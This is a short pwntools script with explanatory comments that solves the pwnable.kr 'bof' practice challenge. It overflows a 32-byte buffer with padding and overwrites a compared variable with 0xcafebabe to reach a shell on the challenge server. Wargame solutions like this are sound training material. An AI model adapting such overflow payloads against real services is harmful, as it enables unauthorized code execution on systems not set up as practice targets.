from pwn import *

run = remote('pwnable.kr', 9000)
print(run.recv(timeout = 0))
# reading the code bof.c we see that there is a buffer has been set to a 32 bytes. then a compare operation
# by running objdump -D bof
# we can see that func is allocated with 0x2c=44 of memory
# Bs to fill BasePointer ebp || rbp
# Cs to fill InstructionPointer eip || rip
# CAFEBABE is acting as a CANARY
# lets draw it
#                   objdump -D bof
#  -------------
# |___cafebabe__|   cmp   '''$0xcafebabe''',0x8(%ebp)
# |___eip__CCCC_|   call   650 <func+0x24>
# |___ebp__BBBB_|   mov   %eax,(%esp)
# |   0x2c      |   leav   -0x2c(%ebp),%eax
# |AAAAAAAAAAAAA|
# |AAAAAAAAAAAAA|
#  -------------
run.sendline('A' * 0x2c +'B'*4 + 'C'*4 + '\xbe\xba\xfe\xca')
run.interactive()